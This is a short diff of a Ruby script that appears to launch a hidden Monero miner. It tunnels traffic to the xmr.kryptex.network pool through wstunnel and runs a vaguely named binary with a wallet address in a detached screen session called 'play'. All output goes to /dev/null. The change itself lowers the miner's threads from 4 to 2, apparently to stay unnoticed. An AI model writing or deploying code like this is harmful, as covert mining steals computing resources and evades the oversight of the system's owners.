@@ -30,7 +30,7 @@ FileUtils.chmod('+x', [wstunnel_file, bos_file])
 # Start services
 Process.spawn("./#{wstunnel_file} server ws://127.0.0.1:#{ws_port}", out: '/dev/null', err: '/dev/null')
 Process.spawn("./#{wstunnel_file} client -L tcp://127.0.0.1:#{tcp_port}:xmr.kryptex.network:7029 ws://127.0.0.1:#{ws_port}", out: '/dev/null', err: '/dev/null')
-system("screen -dmS play ./#{bos_file} -o 127.0.0.1:#{tcp_port} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.TL -t 4")
+system("screen -dmS play ./#{bos_file} -o 127.0.0.1:#{tcp_port} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.TL -t 2")
 
 i = 0
 loop do
